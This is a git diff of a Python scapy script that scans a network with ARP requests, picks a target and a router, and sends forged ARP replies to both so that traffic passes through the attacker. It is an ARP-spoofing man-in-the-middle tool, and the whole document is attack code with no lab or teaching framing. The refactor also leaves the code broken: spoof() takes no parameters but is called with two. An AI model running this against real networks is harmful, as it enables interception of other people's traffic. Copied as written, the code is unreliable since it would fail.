@@ -6,13 +6,6 @@ router_ip = ""
 router_mac = ""
 
 
-def set_params(target, router):
-    target_ip = target["ip"]
-    target_mac = target["mac"]
-    router_ip = router["ip"]
-    router_mac = router["mac"]
-
-
 def get_details():
     ip = input(">> Enter the target ip range : ")
     arp_request = scapy.ARP(pdst=ip) 
@@ -34,12 +27,13 @@ def get_details():
 
     return (device_list[target], device_list[router])
     
-    
-
-    
-
 
 def spoof():
+    target_ip = target["ip"]
+    target_mac = target["mac"]
+    router_ip = router["ip"]
+    router_mac = router["mac"]
+
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
     scapy.send(packet)
     packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
@@ -47,5 +41,4 @@ def spoof():
 
 
 (target, router) = get_details()
-set_params(target, router)
-spoof()
+spoof(target, router)
